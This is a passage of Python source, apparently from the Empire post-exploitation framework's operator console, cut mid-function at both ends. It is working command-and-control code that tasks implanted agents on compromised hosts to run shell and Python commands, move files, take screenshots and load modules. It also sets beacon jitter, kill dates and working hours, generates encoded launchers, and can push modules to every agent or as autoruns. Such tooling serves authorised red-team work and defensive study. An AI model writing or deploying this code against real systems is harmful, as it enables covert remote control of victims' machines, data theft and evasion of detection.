                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_GETJOBS")
                # update the agent log
                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get running jobs")
            else:
                print helpers.color("[!] Please use form 'jobs kill JOB_ID'")
        elif len(parts) == 2:
            jobID = parts[1].strip()
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_STOPJOB", jobID)
            # update the agent log
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to stop job " + str(jobID))


    def do_sleep(self, line):
        "Task an agent to 'sleep interval [jitter]'"

        parts = line.strip().split(' ')
        delay = parts[0]

        # make sure we pass a int()
        if len(parts) >= 1:
            try:
                int(delay)
            except:
                print helpers.color("[!] Please only enter integer for 'interval'")
                return

        if len(parts) > 1:
            try:
                int(parts[1])
            except:
                print helpers.color("[!] Please only enter integer for '[jitter]'")
                return

        if delay == "":
            # task the agent to display the delay/jitter
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global delay; global jitter; print 'delay/jitter = ' + str(delay)+'/'+str(jitter)")
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to display delay/jitter")

        elif len(parts) > 0 and parts[0] != "":
            delay = parts[0]
            jitter = 0.0
            if len(parts) == 2:
                jitter = parts[1]

            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("delay", delay, self.sessionID)
            self.mainMenu.agents.set_agent_field_db("jitter", jitter, self.sessionID)

            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global delay; global jitter; delay=%s; jitter=%s; print 'delay/jitter set to %s/%s'" % (delay, jitter, delay, jitter))

            # update the agent log
            msg = "Tasked agent to delay sleep/jitter " + str(delay) + "/" + str(jitter)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_lostlimit(self, line):
        "Task an agent to display change the limit on lost agent detection"

        parts = line.strip().split(' ')
        lostLimit = parts[0]

        if lostLimit == "":
            # task the agent to display the lostLimit
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global lostLimit; print 'lostLimit = ' + str(lostLimit)")
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to display lost limit")
        else:
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("lost_limit", lostLimit, self.sessionID)

            # task the agent with the new lostLimit
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global lostLimit; lostLimit=%s; print 'lostLimit set to %s'"%(lostLimit, lostLimit))

            # update the agent log
            msg = "Tasked agent to change lost limit " + str(lostLimit)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_killdate(self, line):
        "Get or set an agent's killdate (01/01/2016)."

        parts = line.strip().split(' ')
        killDate = parts[0]

        if killDate == "":

            # task the agent to display the killdate
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global killDate; print 'killDate = ' + str(killDate)")
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to display killDate")
        else:
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("kill_date", killDate, self.sessionID)

            # task the agent with the new killDate
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global killDate; killDate='%s'; print 'killDate set to %s'" % (killDate, killDate))

            # update the agent log
            msg = "Tasked agent to set killdate to %s" %(killDate)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_workinghours(self, line):
        "Get or set an agent's working hours (9:00-17:00)."

        parts = line.strip().split(' ')
        hours = parts[0]

        if hours == "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global workingHours; print 'workingHours = ' + str(workingHours)")
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get working hours")

        else:
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("working_hours", hours, self.sessionID)

            # task the agent with the new working hours
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global workingHours; workingHours= '%s'"%(hours))

            # update the agent log
            msg = "Tasked agent to set working hours to: %s" % (hours)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_shell(self, line):
        "Task an agent to use a shell command."

        line = line.strip()

        if line != "":
            # task the agent with this shell command
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", str(line))
            # update the agent log
            msg = "Tasked agent to run shell command: %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_python(self, line):
        "Task an agent to run a Python command."

        line = line.strip()

        if line != "":
            # task the agent with this shell command
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", str(line))
            # update the agent log
            msg = "Tasked agent to run Python command %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_pythonscript(self, line):
        "Load and execute a python script"
        path = line.strip()

        if os.path.splitext(path)[-1] == '.py' and os.path.isfile(path):
            filename = os.path.basename(path).rstrip('.py')
            open_file = open(path, 'r')
            script = open_file.read()
            open_file.close()
            script = script.replace('\r\n', '\n')
            script = script.replace('\r', '\n')

            msg = "[*] Tasked agent to execute python script: "+filename
            print helpers.color(msg, color="green")
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", script)
            #update the agent log
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
        else:
            print helpers.color("[!] Please provide a valid path", color="red")


    def do_sysinfo(self, line):
        "Task an agent to get system information."

        # task the agent with this shell command
        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SYSINFO")
        # update the agent log
        self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get system information")


    def do_download(self, line):
        "Task an agent to download a file."

        line = line.strip()

        if line != "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_DOWNLOAD", line)
            # update the agent log
            msg = "Tasked agent to download: %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_upload(self, line):
        "Task an agent to upload a file."

        # "upload /path/file.ext" or "upload /path/file/file.ext newfile.ext"
        # absolute paths accepted
        parts = line.strip().split(' ')
        uploadname = ""

        if len(parts) > 0 and parts[0] != "":
            if len(parts) == 1:
                # if we're uploading the file with its original name
                uploadname = os.path.basename(parts[0])
            else:
                # if we're uploading the file as a different name
                uploadname = parts[1].strip()

            if parts[0] != "" and os.path.exists(parts[0]):
                # TODO: reimplement Python file upload

                # # read in the file and base64 encode it for transport
                f = open(parts[0], 'r')
                fileData = f.read()
                f.close()
                # Get file size
                size = os.path.getsize(parts[0])
                if size > 1048576:
                    print helpers.color("[!] File size is too large. Upload limit is 1MB.")
                else:
                    print helpers.color("[*] Starting size of %s for upload: %s" %(uploadname, helpers.get_file_size(fileData)), color="green")
                    msg = "Tasked agent to upload " + parts[0] + " : " + hashlib.md5(fileData).hexdigest()
                    # update the agent log with the filename and MD5
                    self.mainMenu.agents.save_agent_log(self.sessionID, msg)
                    # compress data before we base64
                    c = compress.compress()
                    start_crc32 = c.crc32_data(fileData)
                    comp_data = c.comp_data(fileData, 9)
                    fileData = c.build_header(comp_data, start_crc32)
                    # get final file size
                    print helpers.color("[*] Final tasked size of %s for upload: %s" %(uploadname, helpers.get_file_size(fileData)), color="green")
                    fileData = helpers.encode_base64(fileData)
                    # upload packets -> "filename | script data"
                    data = uploadname + "|" + fileData
                    self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_UPLOAD", data)
            else:
                print helpers.color("[!] Please enter a valid file path to upload")


    def do_usemodule(self, line):
        "Use an Empire Python module."

        module = "python/%s" %(line.strip())

        if module not in self.mainMenu.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            module_menu = ModuleMenu(self.mainMenu, module, agent=self.sessionID)
            module_menu.cmdloop()


    def do_searchmodule(self, line):
        "Search Empire module names/descriptions."

        searchTerm = line.strip()

        if searchTerm.strip() == "":
            print helpers.color("[!] Please enter a search term.")
        else:
            self.mainMenu.modules.search_modules(searchTerm)

    def do_sc(self, line):
        "Use pyobjc and Foundation libraries to take a screenshot, and save the image to the server"

        if self.mainMenu.modules.modules['python/collection/osx/native_screenshot']:
            module = self.mainMenu.modules.modules['python/collection/osx/native_screenshot']
            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
            #execute screenshot module
            msg = "[*] Tasked agent to take a screenshot"
            module_menu = ModuleMenu(self.mainMenu, 'python/collection/osx/native_screenshot')
            print helpers.color(msg, color="green")
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
            module_menu.do_execute("")
        else:
            print helpers.color("[!] python/collection/osx/screenshot module not loaded")

    def do_ls(self, line):
        "List directory contents at the specified path"
        #http://stackoverflow.com/questions/17809386/how-to-convert-a-stat-output-to-a-unix-permissions-string
        if self.mainMenu.modules.modules['python/management/osx/ls']:
            module = self.mainMenu.modules.modules['python/management/osx/ls']
            if line.strip() != '':
                module.options['Path']['Value'] = line.strip()

            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
            module_menu = ModuleMenu(self.mainMenu, 'python/management/osx/ls')
            msg = "[*] Tasked agent to list directory contents of: "+str(module.options['Path']['Value'])
            print helpers.color(msg,color="green")
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
            module_menu.do_execute("")

        else:
            print helpers.color("[!] python/management/osx/ls module not loaded")

    def do_ls_lin(self, line):
        "List directory contents at the specified path"
        
        if self.mainMenu.modules.modules['python/management/multi/linux_ls']:
            module = self.mainMenu.modules.modules['python/management/multi/linux_ls']
            if line.strip() != '':
                module.options['Path']['Value'] = line.strip()

            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
            module_menu = ModuleMenu(self.mainMenu, 'python/management/multi/linux_ls')
            msg = "[*] Tasked agent to list directory contents of: "+str(module.options['Path']['Value'])
            print helpers.color(msg,color="green")
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
            module_menu.do_execute("")

        else:
            print helpers.color("[!] python/management/multi/ls_lin module not loaded")

    def do_whoami(self, line):
        "Print the currently logged in user"

        command = "from AppKit import NSUserName; print str(NSUserName())"
        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", command)
        msg = "Tasked agent to print currently logged on user"
        self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_loadpymodule(self, line):
        "Import zip file containing a .py module or package with an __init__.py"

        path = line.strip()
        #check the file ext and confirm that the path given is a file
        if os.path.splitext(path)[-1] == '.zip' and os.path.isfile(path):
            #open a handle to the file and save the data to a variable, zlib compress
            filename = os.path.basename(path).rstrip('.zip')
            open_file = open(path, 'rb')
            module_data = open_file.read()
            open_file.close()
            msg = "Tasked agent to import "+path+" : "+hashlib.md5(module_data).hexdigest()
            print helpers.color("[*] "+msg, color="green")
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
            c = compress.compress()
            start_crc32 = c.crc32_data(module_data)
            comp_data = c.comp_data(module_data, 9)
            module_data = c.build_header(comp_data, start_crc32)
            module_data = helpers.encode_base64(module_data)
            data = filename + '|' + module_data
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_IMPORT_MODULE", data)
        else:
            print helpers.color("[!] Please provide a valid zipfile path", color="red")

    def do_viewrepo(self, line):
        "View the contents of a repo. if none is specified, all files will be returned"
        repoName = line.strip()
        msg = "[*] Tasked agent to view repo contents: " + repoName
        print helpers.color(msg, color="green")
        self.mainMenu.agents.save_agent_log(self.sessionID, msg)
        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_VIEW_MODULE", repoName)

    def do_removerepo(self, line):
        "Remove a repo"
        repoName = line.strip()
        msg = "[*] Tasked agent to remove repo: "+repoName
        print helpers.color(msg, color="green")
        self.mainMenu.agents.save_agent_log(self.sessionID, msg)
        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_REMOVE_MODULE", repoName)

    def do_creds(self, line):
        "Display/return credentials from the database."
        self.mainMenu.do_creds(line)

    def complete_loadpymodule(self, text, line, begidx, endidx):
        "Tab-complete a zip file path"
        return helpers.complete_path(text, line)

    def complete_pythonscript(self, text, line, begidx, endidx):
        "Tab-complete a zip file path"
        return helpers.complete_path(text, line)

    def complete_usemodule(self, text, line, begidx, endidx):
        "Tab-complete an Empire Python module path"
        return self.mainMenu.complete_usemodule(text, line, begidx, endidx, language='python')


    def complete_upload(self, text, line, begidx, endidx):
        "Tab-complete an upload file path"
        return helpers.complete_path(text, line)

    # def complete_updateprofile(self, text, line, begidx, endidx):
    #     "Tab-complete an updateprofile path"
    #     return helpers.complete_path(text,line)


class ListenersMenu(cmd.Cmd):
    """
    The main class used by Empire to drive the 'listener' menu.
    """
    def __init__(self, mainMenu):
        cmd.Cmd.__init__(self)

        self.mainMenu = mainMenu

        self.doc_header = 'Listener Commands'

        # set the prompt text
        self.prompt = '(Empire: ' + helpers.color('listeners', color='blue') + ') > '

        # display all active listeners on menu startup
        messages.display_active_listeners(self.mainMenu.listeners.activeListeners)

    # def preloop(self):
    #     traceback.print_stack()

    # print a nicely formatted help menu
    # stolen/adapted from recon-ng
    def print_topics(self, header, commands, cmdlen, maxcol):
        if commands:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for command in commands:
                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
            self.stdout.write("\n")


    def emptyline(self):
        pass


    def do_back(self, line):
        "Go back to the main menu."
        raise NavMain()


    def do_agents(self, line):
        "Jump to the Agents menu."
        raise NavAgents()


    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()


    def do_exit(self, line):
        "Exit Empire."
        raise KeyboardInterrupt


    def do_list(self, line):
        "List all active listeners (or agents)."

        if line.lower().startswith('agents'):
            self.mainMenu.do_list('agents ' + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("listeners"):
            self.mainMenu.do_list('listeners ' + str(' '.join(line.split(' ')[1:])))
        else:
            self.mainMenu.do_list('listeners ' + str(line))


    def do_kill(self, line):
        "Kill one or all active listeners."

        listenerID = line.strip()

        if listenerID.lower() == 'all':
            try:
                choice = raw_input(helpers.color('[>] Kill all listeners? [y/N] ', 'red'))
                if choice.lower() != '' and choice.lower()[0] == 'y':
                    self.mainMenu.listeners.kill_listener('all')
            except KeyboardInterrupt:
                print ''

        else:
            self.mainMenu.listeners.kill_listener(listenerID)


    def do_usestager(self, line):
        "Use an Empire stager."

        parts = line.split(' ')

        if parts[0] not in self.mainMenu.stagers.stagers:
            print helpers.color("[!] Error: invalid stager module")

        elif len(parts) == 1:
            stager_menu = StagerMenu(self.mainMenu, parts[0])
            stager_menu.cmdloop()
        elif len(parts) == 2:
            listener = parts[1]
            if not self.mainMenu.listeners.is_listener_valid(listener):
                print helpers.color("[!] Please enter a valid listener name or ID")
            else:
                self.mainMenu.stagers.set_stager_option('Listener', listener)
                stager_menu = StagerMenu(self.mainMenu, parts[0])
                stager_menu.cmdloop()
        else:
            print helpers.color("[!] Error in ListenerMenu's do_userstager()")


    def do_uselistener(self, line):
        "Use an Empire listener module."

        parts = line.split(' ')

        if parts[0] not in self.mainMenu.listeners.loadedListeners:
            print helpers.color("[!] Error: invalid listener module")
        else:
            listenerMenu = ListenerMenu(self.mainMenu, parts[0])
            listenerMenu.cmdloop()


    def do_info(self, line):
        "Display information for the given active listener."

        listenerName = line.strip()

        if listenerName not in self.mainMenu.listeners.activeListeners:
            print helpers.color("[!] Invalid listener name")
        else:
            messages.display_active_listener(self.mainMenu.listeners.activeListeners[listenerName])


    def do_launcher(self, line):
        "Generate an initial launcher for a listener."

        parts = line.strip().split()
        if len(parts) != 2:
            print helpers.color("[!] Please enter 'launcher <language> <listenerName>'")
            return
        else:
            language = parts[0].lower()
            listenerName = self.mainMenu.listeners.get_listener_name(parts[1])

        if listenerName:
            try:
                # set the listener value for the launcher
                stager = self.mainMenu.stagers.stagers['multi/launcher']
                stager.options['Listener']['Value'] = listenerName
                stager.options['Language']['Value'] = language
                stager.options['Base64']['Value'] = "True"
                print stager.generate()
            except Exception as e:
                print helpers.color("[!] Error generating launcher: %s" % (e))

        else:
            print helpers.color("[!] Please enter a valid listenerName")


    def complete_usestager(self, text, line, begidx, endidx):
        "Tab-complete an Empire stager module path."
        return self.mainMenu.complete_usestager(text, line, begidx, endidx)


    def complete_kill(self, text, line, begidx, endidx):
        "Tab-complete listener names"

        # get all the listener names
        names = self.mainMenu.listeners.activeListeners.keys() + ["all"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]


    def complete_launcher(self, text, line, begidx, endidx):
        "Tab-complete language types and listener names/IDs"

        languages = ['powershell', 'python']

        if line.split(' ')[1].lower() in languages:
            # if we already have a language name, tab-complete listener names
            listenerNames = self.mainMenu.listeners.get_listener_names()
            end_line = ' '.join(line.split(' ')[1:])
            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]
        else:
            # otherwise tab-complate the stager names
            mline = line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in languages if s.startswith(mline)]


    def complete_info(self, text, line, begidx, endidx):
        "Tab-complete listener names/IDs"

        # get all the listener names
        names = self.mainMenu.listeners.activeListeners.keys()
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]


    def complete_uselistener(self, text, line, begidx, endidx):
        "Tab-complete an uselistener command"

        names = self.mainMenu.listeners.loadedListeners.keys()
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]


class ListenerMenu(cmd.Cmd):

    def __init__(self, mainMenu, listenerName):

        cmd.Cmd.__init__(self)

        self.mainMenu = mainMenu

        if listenerName not in self.mainMenu.listeners.loadedListeners:
            print helpers.color("[!] Listener '%s' not currently valid!" % (listenerName))
            raise NavListeners()

        self.doc_header = 'Listener Commands'

        self.listener = self.mainMenu.listeners.loadedListeners[listenerName]
        self.listenerName = listenerName

        # set the text prompt
        self.prompt = '(Empire: ' + helpers.color("listeners/%s" % (listenerName), 'red') + ') > '


    def emptyline(self):
        """
        If any empty line is entered, do nothing.
        """
        pass


    def do_back(self, line):
        "Go back a menu."
        return True


    def do_agents(self, line):
        "Jump to the Agents menu."
        raise NavAgents()


    def do_listeners(self, line):
        "Jump to the listeners menu."
        raise NavListeners()


    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()


    def do_exit(self, line):
        "Exit Empire."
        raise KeyboardInterrupt


    def do_info(self, line):
        "Display listener module options."
        messages.display_listener_module(self.listener)


    def do_execute(self, line):
        "Execute the given listener module."

        self.mainMenu.listeners.start_listener(self.listenerName, self.listener)


    def do_launcher(self, line):
        "Generate an initial launcher for this listener."

        self.listenerName = self.listener.options['Name']['Value']
        parts = line.strip().split()

        if len(parts) != 1:
            print helpers.color("[!] Please enter 'launcher <language>'")
            return

        try:
            # set the listener value for the launcher
            stager = self.mainMenu.stagers.stagers['multi/launcher']
            stager.options['Listener']['Value'] = self.listenerName
            stager.options['Language']['Value'] = parts[0]
            stager.options['Base64']['Value'] = "True"
            print stager.generate()
        except Exception as e:
            print helpers.color("[!] Error generating launcher: %s" % (e))


    def do_set(self, line):
        "Set a listener option."

        parts = line.split()

        try:
            option = parts[0]
            if option not in self.listener.options:
                print helpers.color("[!] Invalid option specified.")

            elif len(parts) == 1:
                # "set OPTION"
                # check if we're setting a switch
                if self.listener.options[option]['Description'].startswith("Switch."):
                    self.listener.options[option]['Value'] = "True"
                else:
                    print helpers.color("[!] Please specify an option value.")
            else:
                # otherwise "set OPTION VALUE"
                option = parts[0]
                value = ' '.join(parts[1:])

                if value == '""' or value == "''":
                    value = ""

                self.mainMenu.listeners.set_listener_option(self.listenerName, option, value)

        except Exception as e:
            print helpers.color("[!] Error in setting listener option: %s" % (e))


    def do_unset(self, line):
        "Unset a listener option."

        option = line.split()[0]

        if line.lower() == "all":
            for option in self.listener.options:
                self.listener.options[option]['Value'] = ''
        if option not in self.listener.options:
            print helpers.color("[!] Invalid option specified.")
        else:
            self.listener.options[option]['Value'] = ''


    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete a listener option to set."

        options = self.listener.options.keys()

        if line.split(' ')[1].lower().endswith('path'):
            return helpers.complete_path(text, line, arg=True)

        elif line.split(' ')[1].lower().endswith('file'):
            return helpers.complete_path(text, line, arg=True)

        elif line.split(' ')[1].lower().endswith('host'):
            return [helpers.lhost()]

        elif line.split(' ')[1].lower().endswith('listener'):
            listenerNames = self.mainMenu.listeners.get_listener_names()
            end_line = ' '.join(line.split(' ')[1:])
            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]

        # otherwise we're tab-completing an option name
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_unset(self, text, line, begidx, endidx):
        "Tab-complete a module option to unset."

        options = self.listener.options.keys()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_launcher(self, text, line, begidx, endidx):
        "Tab-complete language types"

        languages = ['powershell', 'python']

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in languages if s.startswith(mline)]


class ModuleMenu(cmd.Cmd):
    """
    The main class used by Empire to drive the 'module' menu.
    """
    def __init__(self, mainMenu, moduleName, agent=None):

        cmd.Cmd.__init__(self)
        self.doc_header = 'Module Commands'
        self.mainMenu = mainMenu

        try:
            # get the current module/name
            self.moduleName = moduleName
            self.module = self.mainMenu.modules.modules[moduleName]

            # set the prompt text
            self.prompt = '(Empire: ' + helpers.color(self.moduleName, color="blue") + ') > '

            # if this menu is being called from an agent menu
            if agent and 'Agent' in self.module.options:
                # resolve the agent sessionID to a name, if applicable
                agent = self.mainMenu.agents.get_agent_name_db(agent)
                self.module.options['Agent']['Value'] = agent

        except Exception as e:
            print helpers.color("[!] ModuleMenu() init error: %s" % (e))

    # def preloop(self):
    #     traceback.print_stack()

    def validate_options(self):
        "Ensure all required module options are completed."

        # ensure all 'Required=True' options are filled in
        for option, values in self.module.options.iteritems():
            if values['Required'] and ((not values['Value']) or (values['Value'] == '')):
                print helpers.color("[!] Error: Required module option missing.")
                return False

        # 'Agent' is set for all but external/* modules
        if 'Agent' in self.module.options:
            sessionID = self.module.options['Agent']['Value']
            try:
                # if we're running this module for all agents, skip this validation
                if sessionID.lower() != "all" and sessionID.lower() != "autorun":
                    moduleLangVersion = float(self.module.info['MinLanguageVersion'])
                    agentLangVersion = float(self.mainMenu.agents.get_language_version_db(sessionID))

                    # check if the agent/module PowerShell versions are compatible
                    if moduleLangVersion > agentLangVersion:
                        print helpers.color("[!] Error: module requires language version %s but agent running version %s" % (moduleLangVersion, agentPSVersion))
                        return False
            except Exception as e:
                print helpers.color("[!] Invalid module or agent language version: %s" % (e))
                return False

            # check if the module needs admin privs
            if self.module.info['NeedsAdmin']:
                # if we're running this module for all agents, skip this validation
                if sessionID.lower() != "all" and sessionID.lower() != "autorun":
                    if not self.mainMenu.agents.is_agent_elevated(sessionID):
                        print helpers.color("[!] Error: module needs to run in an elevated context.")
                        return False

        # if the module isn't opsec safe, prompt before running
        if ('OpsecSafe' in self.module.info) and (not self.module.info['OpsecSafe']):
            try:
                choice = raw_input(helpers.color("[>] Module is not opsec safe, run? [y/N] ", "red"))
                if not (choice.lower() != "" and choice.lower()[0] == "y"):
                    return False
            except KeyboardInterrupt:
                print ""
                return False

        return True


    def emptyline(self):
        pass


    # print a nicely formatted help menu
    # stolen/adapted from recon-ng
    def print_topics(self, header, commands, cmdlen, maxcol):
        if commands:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for command in commands:
                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
            self.stdout.write("\n")


    def do_back(self, line):
        "Go back a menu."
        return True


    def do_agents(self, line):
        "Jump to the Agents menu."
        raise NavAgents()


    def do_listeners(self, line):
        "Jump to the listeners menu."
        raise NavListeners()


    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()


    def do_exit(self, line):
        "Exit Empire."
        raise KeyboardInterrupt


    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
        else:
            print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")


    def do_reload(self, line):
        "Reload the current module."

        print "\n" + helpers.color("[*] Reloading module") + "\n"

        # reload the specific module
        self.mainMenu.modules.reload_module(self.moduleName)
        # regrab the reference
        self.module = self.mainMenu.modules.modules[self.moduleName]


    def do_info(self, line):
        "Display module options."
        messages.display_module(self.moduleName, self.module)


    def do_options(self, line):
        "Display module options."
        messages.display_module(self.moduleName, self.module)


    def do_set(self, line):
        "Set a module option."

        parts = line.split()

        try:
            option = parts[0]
            if option not in self.module.options:
                print helpers.color("[!] Invalid option specified.")

            elif len(parts) == 1:
                # "set OPTION"
                # check if we're setting a switch
                if self.module.options[option]['Description'].startswith("Switch."):
                    self.module.options[option]['Value'] = "True"
                else:
                    print helpers.color("[!] Please specify an option value.")
            else:
                # otherwise "set OPTION VALUE"
                option = parts[0]
                value = ' '.join(parts[1:])

                if value == '""' or value == "''":
                    value = ""

                self.module.options[option]['Value'] = value
        except:
            print helpers.color("[!] Error in setting option, likely invalid option name.")


    def do_unset(self, line):
        "Unset a module option."

        option = line.split()[0]

        if line.lower() == "all":
            for option in self.module.options:
                self.module.options[option]['Value'] = ''
        if option not in self.module.options:
            print helpers.color("[!] Invalid option specified.")
        else:
            self.module.options[option]['Value'] = ''


    def do_usemodule(self, line):
        "Use an Empire PowerShell module."

        module = line.strip()

        if module not in self.mainMenu.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            module_menu = ModuleMenu(self.mainMenu, line, agent=self.module.options['Agent']['Value'])
            module_menu.cmdloop()


    def do_creds(self, line):
        "Display/return credentials from the database."
        self.mainMenu.do_creds(line)


    def do_execute(self, line):
        "Execute the given Empire module."

        if not self.validate_options():
            return

        if self.moduleName.lower().startswith('external/'):
            # externa/* modules don't include an agent specification, and only have
            #   an execute() method'
            self.module.execute()
        else:
            agentName = self.module.options['Agent']['Value']
            moduleData = self.module.generate()

            if not moduleData or moduleData == "":
                print helpers.color("[!] Error: module produced an empty script")
                dispatcher.send("[!] Error: module produced an empty script", sender="Empire")
                return

            try:
                moduleData.decode('ascii')
            except UnicodeDecodeError:
                print helpers.color("[!] Error: module source contains non-ascii characters")
                return

            # strip all comments from the module
            moduleData = helpers.strip_powershell_comments(moduleData)

            taskCommand = ""

            # build the appropriate task command and module data blob
            if str(self.module.info['Background']).lower() == "true":
                # if this module should be run in the background
                extention = self.module.info['OutputExtension']
                if extention and extention != "":
                    # if this module needs to save its file output to the server
                    #   format- [15 chars of prefix][5 chars extension][data]
                    saveFilePrefix = self.moduleName.split("/")[-1]
                    moduleData = saveFilePrefix.rjust(15) + extention.rjust(5) + moduleData
                    taskCommand = "TASK_CMD_JOB_SAVE"
                else:
                    taskCommand = "TASK_CMD_JOB"
            else:
                # if this module is run in the foreground
                extention = self.module.info['OutputExtension']
                if self.module.info['OutputExtension'] and self.module.info['OutputExtension'] != "":
                    # if this module needs to save its file output to the server
                    #   format- [15 chars of prefix][5 chars extension][data]
                    saveFilePrefix = self.moduleName.split("/")[-1][:15]
                    moduleData = saveFilePrefix.rjust(15) + extention.rjust(5) + moduleData
                    taskCommand = "TASK_CMD_WAIT_SAVE"
                else:
                    taskCommand = "TASK_CMD_WAIT"

            # if we're running the module on all modules
            if agentName.lower() == "all":
                try:
                    choice = raw_input(helpers.color("[>] Run module on all agents? [y/N] ", "red"))
                    if choice.lower() != "" and choice.lower()[0] == "y":

                        # signal everyone with what we're doing
                        print helpers.color("[*] Tasking all agents to run " + self.moduleName)
                        dispatcher.send("[*] Tasking all agents to run " + self.moduleName, sender="Empire")

                        # actually task the agents
                        for agent in self.mainMenu.agents.get_agents_db():

                            sessionID = agent['session_id']

                            # set the agent's tasking in the cache
                            self.mainMenu.agents.add_agent_task_db(sessionID, taskCommand, moduleData)

                            # update the agent log
                            # dispatcher.send("[*] Tasked agent "+sessionID+" to run module " + self.moduleName, sender="Empire")
                            dispatcher.send("[*] Tasked agent %s to run module %s" % (sessionID, self.moduleName), sender="Empire")
                            msg = "Tasked agent to run module %s" % (self.moduleName)
                            self.mainMenu.agents.save_agent_log(sessionID, msg)

                except KeyboardInterrupt:
                    print ""

            # set the script to be the global autorun
            elif agentName.lower() == "autorun":

                self.mainMenu.agents.set_autoruns_db(taskCommand, moduleData)
                dispatcher.send("[*] Set module %s to be global script autorun." % (self.moduleName), sender="Empire")

            else:
                if not self.mainMenu.agents.is_agent_present(agentName):
                    print helpers.color("[!] Invalid agent name.")
                else:
                    # set the agent's tasking in the cache
                    self.mainMenu.agents.add_agent_task_db(agentName, taskCommand, moduleData)

                    # update the agent log
                    dispatcher.send("[*] Tasked agent %s to run module %s" % (agentName, self.moduleName), sender="Empire")
                    msg = "Tasked agent to run module %s" % (self.moduleName)
                    self.mainMenu.agents.save_agent_log(agentName, msg)


    def do_run(self, line):
        "Execute the given Empire module."
        self.do_execute(line)


    def do_interact(self, line):
        "Interact with a particular agent."

        name = line.strip()

        if name != "" and self.mainMenu.agents.is_agent_present(name):
